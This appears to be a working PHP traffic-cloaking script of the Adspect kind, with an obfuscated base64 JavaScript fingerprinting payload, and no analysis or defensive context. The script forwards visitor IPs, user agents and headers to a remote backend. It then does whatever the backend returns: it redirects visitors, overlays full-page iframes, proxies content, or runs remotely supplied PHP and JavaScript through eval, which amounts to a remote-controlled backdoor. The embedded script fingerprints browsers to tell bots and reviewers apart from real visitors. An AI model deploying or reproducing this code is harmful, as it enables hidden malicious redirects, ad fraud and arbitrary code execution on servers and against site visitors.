<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('4e4ae885-df48-46e2-b86f-b5f88e00e8b9', 'redirect', '_', base64_decode('OOvmogslTfrcmhlU/c4v0G9qPbdaJwu3vm4r6UWKzFk=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDM0OTQ9WyczNjQxaVJ3ZnhsJywnMjA2NzIxZG5QWlRSJywndmFsdWUnLCdhdHRyaWJ1dGVzJywnbm9kZU5hbWUnLCdoaWRkZW4nLCd0b3VjaEV2ZW50JywncXVlcnknLCdnZXRQYXJhbWV0ZXInLCdzdGF0ZScsJzFXcUN6a2snLCdhY3Rpb24nLCduYXZpZ2F0b3InLCdtZXNzYWdlJywnNTMwNjNTZWN6ZGYnLCdnZXRDb250ZXh0JywnMTA5Mjc0N1pKWmh3aycsJ2Zvcm0nLCdib2R5JywnZXJyb3JzJywnbG9jYXRpb24nLCdOb3RpZmljYXRpb24nLCcyNExOWU1zWicsJ3RoZW4nLCcxNTIxMjNLalRVakcnLCdwdXNoJywnbGVuZ3RoJywnb2JqZWN0JywnMVJJaXBKUCcsJ25vZGVWYWx1ZScsJzM2NDkyMGdWQnVBTycsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnZnVuY3Rpb24nLCdwZXJtaXNzaW9uJywncGVybWlzc2lvbnMnLCd3ZWJnbCcsJzhVaHVUbHQnLCdpbnB1dCcsJ2xvZycsJ2NvbnNvbGUnLCdhcHBlbmRDaGlsZCcsJ2RhdGEnLCdzdHJpbmdpZnknLCd3aW5kb3cnLCcxNjA1NDE1aE91am12JywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ3Rvc3RyaW5nJywnZ2V0RXh0ZW5zaW9uJywnMUdsaUxPQicsJzcxb2FDeGxOJywnZ2V0VGltZXpvbmVPZmZzZXQnLCdjcmVhdGVFbGVtZW50JywnZ2V0T3duUHJvcGVydHlOYW1lcycsJ3RvU3RyaW5nJ107dmFyIF8weDJlZTQ9ZnVuY3Rpb24oXzB4MTA4MDcwLF8weDU2NGRlZil7XzB4MTA4MDcwPV8weDEwODA3MC0weDEyNTt2YXIgXzB4MzQ5NDk0PV8weDM0OTRbXzB4MTA4MDcwXTtyZXR1cm4gXzB4MzQ5NDk0O307KGZ1bmN0aW9uKF8weDE3NjBjNSxfMHgxZDJkNGUpe3ZhciBfMHg0NzNmMzA9XzB4MmVlNDt3aGlsZSghIVtdKXt0cnl7dmFyIF8weGU5ZDU2ZD0tcGFyc2VJbnQoXzB4NDczZjMwKDB4MTQ5KSkqcGFyc2VJbnQoXzB4NDczZjMwKDB4MTRlKSkrLXBhcnNlSW50KF8weDQ3M2YzMCgweDE0ZikpKi1wYXJzZUludChfMHg0NzNmMzAoMHgxNDgpKSstcGFyc2VJbnQoXzB4NDczZjMwKDB4MTQ0KSkqcGFyc2VJbnQoXzB4NDczZjMwKDB4MTU4KSkrcGFyc2VJbnQoXzB4NDczZjMwKDB4MTJlKSkqLXBhcnNlSW50KF8weDQ3M2YzMCgweDEyNikpK3BhcnNlSW50KF8weDQ3M2YzMCgweDEyOCkpKnBhcnNlSW50KF8weDQ3M2YzMCgweDEzNCkpKy1wYXJzZUludChfMHg0NzNmMzAoMHgxMzApKSstcGFyc2VJbnQoXzB4NDczZjMwKDB4MTNjKSkqLXBhcnNlSW50KF8weDQ3M2YzMCgweDEzNikpO2lmKF8weGU5ZDU2ZD09PV8weDFkMmQ0ZSlicmVhaztlbHNlIF8weDE3NjBjNVsncHVzaCddKF8weDE3NjBjNVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MzZhMGQ1KXtfMHgxNzYwYzVbJ3B1c2gnXShfMHgxNzYwYzVbJ3NoaWZ0J10oKSk7fX19KF8weDM0OTQsMHhlMmRmMyksZnVuY3Rpb24oKXt2YXIgXzB4MmRmOGMyPV8weDJlZTQ7ZnVuY3Rpb24gXzB4MWQyM2Y5KCl7dmFyIF8weDE4MmUxND1fMHgyZWU0O18weDM2MGJiOVtfMHgxODJlMTQoMHgxMmIpXT1fMHg0Yzk1NDE7dmFyIF8weDJmMDdkYj1kb2N1bWVudFtfMHgxODJlMTQoMHgxNGIpXShfMHgxODJlMTQoMHgxMjkpKSxfMHgzOWFlNzk9ZG9jdW1lbnRbXzB4MTgyZTE0KDB4MTRiKV0oXzB4MTgyZTE0KDB4MTNkKSk7XzB4MmYwN2RiWydtZXRob2QnXT0nUE9TVCcsXzB4MmYwN2RiW18weDE4MmUxNCgweDE1OSldPXdpbmRvd1tfMHgxODJlMTQoMHgxMmMpXVsnaHJlZiddLF8weDM5YWU3OVsndHlwZSddPV8weDE4MmUxNCgweDE1MyksXzB4MzlhZTc5WyduYW1lJ109XzB4MTgyZTE0KDB4MTQxKSxfMHgzOWFlNzlbXzB4MTgyZTE0KDB4MTUwKV09SlNPTltfMHgxODJlMTQoMHgxNDIpXShfMHgzNjBiYjkpLF8weDJmMDdkYltfMHgxODJlMTQoMHgxNDApXShfMHgzOWFlNzkpLGRvY3VtZW50W18weDE4MmUxNCgweDEyYSldW18weDE4MmUxNCgweDE0MCldKF8weDJmMDdkYiksXzB4MmYwN2RiWydzdWJtaXQnXSgpO312YXIgXzB4NGM5NTQxPVtdLF8weDM2MGJiOT17fTt0cnl7dmFyIF8weDQ3Mzk1Yz1mdW5jdGlvbihfMHgxZjcxNGYpe3ZhciBfMHg1ODlhOWY9XzB4MmVlNDtpZignb2JqZWN0Jz09PXR5cGVvZiBfMHgxZjcxNGYmJm51bGwhPT1fMHgxZjcxNGYpe3ZhciBfMHgxNzIxOTU9ZnVuY3Rpb24oXzB4MjhlOGVkKXt2YXIgXzB4MjdiNjA2PV8weDJlZTQ7dHJ5e3ZhciBfMHg1NGYzNWQ9XzB4MWY3MTRmW18weDI4ZThlZF07c3dpdGNoKHR5cGVvZiBfMHg1NGYzNWQpe2Nhc2UgXzB4MjdiNjA2KDB4MTMzKTppZihudWxsPT09XzB4NTRmMzVkKWJyZWFrO2Nhc2UgXzB4MjdiNjA2KDB4MTM4KTpfMHg1NGYzNWQ9XzB4NTRmMzVkW18weDI3YjYwNigweDE0ZCldKCk7fV8weDFmMTcwNltfMHgyOGU4ZWRdPV8weDU0ZjM1ZDt9Y2F0Y2goXzB4MmQzMjY0KXtfMHg0Yzk1NDFbJ3B1c2gnXShfMHgyZDMyNjRbJ21lc3NhZ2UnXSk7fX0sXzB4MWYxNzA2PXt9LF8weDRkOGI5NDtmb3IoXzB4NGQ4Yjk0IGluIF8weDFmNzE0ZilfMHgxNzIxOTUoXzB4NGQ4Yjk0KTt0cnl7dmFyIF8weDJiYTZiOT1PYmplY3RbXzB4NTg5YTlmKDB4MTRjKV0oXzB4MWY3MTRmKTtmb3IoXzB4NGQ4Yjk0PTB4MDtfMHg0ZDhiOTQ8XzB4MmJhNmI5W18weDU4OWE5ZigweDEzMildOysrXzB4NGQ4Yjk0KV8weDE3MjE5NShfMHgyYmE2YjlbXzB4NGQ4Yjk0XSk7XzB4MWYxNzA2WychISddPV8weDJiYTZiOTt9Y2F0Y2goXzB4NTU1ZGI5KXtfMHg0Yzk1NDFbJ3B1c2gnXShfMHg1NTVkYjlbXzB4NTg5YTlmKDB4MTI1KV0pO31yZXR1cm4gXzB4MWYxNzA2O319O18weDM2MGJiOVsnc2NyZWVuJ109XzB4NDczOTVjKHdpbmRvd1snc2NyZWVuJ10pLF8weDM2MGJiOVtfMHgyZGY4YzIoMHgxNDMpXT1fMHg0NzM5NWMod2luZG93KSxfMHgzNjBiYjlbXzB4MmRmOGMyKDB4MTVhKV09XzB4NDczOTVjKHdpbmRvd1tfMHgyZGY4YzIoMHgxNWEpXSksXzB4MzYwYmI5W18weDJkZjhjMigweDEyYyldPV8weDQ3Mzk1Yyh3aW5kb3dbXzB4MmRmOGMyKDB4MTJjKV0pLF8weDM2MGJiOVtfMHgyZGY4YzIoMHgxM2YpXT1fMHg0NzM5NWMod2luZG93W18weDJkZjhjMigweDEzZildKSxfMHgzNjBiYjlbJ2RvY3VtZW50RWxlbWVudCddPWZ1bmN0aW9uKF8weDkwZWE4ZSl7dmFyIF8weDgyNDZlNT1fMHgyZGY4YzI7dHJ5e3ZhciBfMHgyOTI2N2U9e307XzB4OTBlYThlPV8weDkwZWE4ZVtfMHg4MjQ2ZTUoMHgxNTEpXTtmb3IodmFyIF8weDNmYjYxYSBpbiBfMHg5MGVhOGUpXzB4M2ZiNjFhPV8weDkwZWE4ZVtfMHgzZmI2MWFdLF8weDI5MjY3ZVtfMHgzZmI2MWFbXzB4ODI0NmU1KDB4MTUyKV1dPV8weDNmYjYxYVtfMHg4MjQ2ZTUoMHgxMzUpXTtyZXR1cm4gXzB4MjkyNjdlO31jYXRjaChfMHgxZDJiNDIpe18weDRjOTU0MVtfMHg4MjQ2ZTUoMHgxMzEpXShfMHgxZDJiNDJbXzB4ODI0NmU1KDB4MTI1KV0pO319KGRvY3VtZW50Wydkb2N1bWVudEVsZW1lbnQnXSksXzB4MzYwYmI5Wydkb2N1bWVudCddPV8weDQ3Mzk1Yyhkb2N1bWVudCk7dHJ5e18weDM2MGJiOVsndGltZXpvbmVPZmZzZXQnXT1uZXcgRGF0ZSgpW18weDJkZjhjMigweDE0YSldKCk7fWNhdGNoKF8weDVkNjM0ZCl7XzB4NGM5NTQxW18weDJkZjhjMigweDEzMSldKF8weDVkNjM0ZFtfMHgyZGY4YzIoMHgxMjUpXSk7fXRyeXtfMHgzNjBiYjlbJ2Nsb3N1cmUnXT1mdW5jdGlvbigpe31bXzB4MmRmOGMyKDB4MTRkKV0oKTt9Y2F0Y2goXzB4MmVmODVjKXtfMHg0Yzk1NDFbXzB4MmRmOGMyKDB4MTMxKV0oXzB4MmVmODVjW18weDJkZjhjMigweDEyNSldKTt9dHJ5e18weDM2MGJiOVtfMHgyZGY4YzIoMHgxNTQpXT1kb2N1bWVudFsnY3JlYXRlRXZlbnQnXSgnVG91Y2hFdmVudCcpW18weDJkZjhjMigweDE0ZCldKCk7fWNhdGNoKF8weDg2NTJiZSl7XzB4NGM5NTQxW18weDJkZjhjMigweDEzMSldKF8weDg2NTJiZVtfMHgyZGY4YzIoMHgxMjUpXSk7fXRyeXtfMHg0NzM5NWM9ZnVuY3Rpb24oKXt9O3ZhciBfMHhhMjA5Yzk9MHgwO18weDQ3Mzk1Y1tfMHgyZGY4YzIoMHgxNGQpXT1mdW5jdGlvbigpe3JldHVybisrXzB4YTIwOWM5LCcnO30sY29uc29sZVtfMHgyZGY4YzIoMHgxM2UpXShfMHg0NzM5NWMpLF8weDM2MGJiOVtfMHgyZGY4YzIoMHgxNDYpXT1fMHhhMjA5Yzk7fWNhdGNoKF8weDcxZjI4OSl7XzB4NGM5NTQxW18weDJkZjhjMigweDEzMSldKF8weDcxZjI4OVtfMHgyZGY4YzIoMHgxMjUpXSk7fXdpbmRvd1tfMHgyZGY4YzIoMHgxNWEpXVtfMHgyZGY4YzIoMHgxM2EpXVtfMHgyZGY4YzIoMHgxNTUpXSh7J25hbWUnOidub3RpZmljYXRpb25zJ30pW18weDJkZjhjMigweDEyZildKGZ1bmN0aW9uKF8weDE1MTEwMyl7dmFyIF8weDI5NWI5OT1fMHgyZGY4YzI7XzB4MzYwYmI5W18weDI5NWI5OSgweDEzYSldPVt3aW5kb3dbXzB4Mjk1Yjk5KDB4MTJkKV1bXzB4Mjk1Yjk5KDB4MTM5KV0sXzB4MTUxMTAzW18weDI5NWI5OSgweDE1NyldXSxfMHgxZDIzZjkoKTt9LF8weDFkMjNmOSk7dHJ5e3ZhciBfMHg1YTNhNWE9ZG9jdW1lbnRbXzB4MmRmOGMyKDB4MTRiKV0oJ2NhbnZhcycpW18weDJkZjhjMigweDEyNyldKF8weDJkZjhjMigweDEzYikpLF8weDIyODY4OD1fMHg1YTNhNWFbXzB4MmRmOGMyKDB4MTQ3KV0oXzB4MmRmOGMyKDB4MTQ1KSk7XzB4MzYwYmI5W18weDJkZjhjMigweDEzYildPXsndmVuZG9yJzpfMHg1YTNhNWFbXzB4MmRmOGMyKDB4MTU2KV0oXzB4MjI4Njg4WydVTk1BU0tFRF9WRU5ET1JfV0VCR0wnXSksJ3JlbmRlcmVyJzpfMHg1YTNhNWFbXzB4MmRmOGMyKDB4MTU2KV0oXzB4MjI4Njg4W18weDJkZjhjMigweDEzNyldKX07fWNhdGNoKF8weDM3NDZmNyl7XzB4NGM5NTQxW18weDJkZjhjMigweDEzMSldKF8weDM3NDZmN1snbWVzc2FnZSddKTt9fWNhdGNoKF8weDQ0NjAwNyl7XzB4NGM5NTQxW18weDJkZjhjMigweDEzMSldKF8weDQ0NjAwN1tfMHgyZGY4YzIoMHgxMjUpXSksXzB4MWQyM2Y5KCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;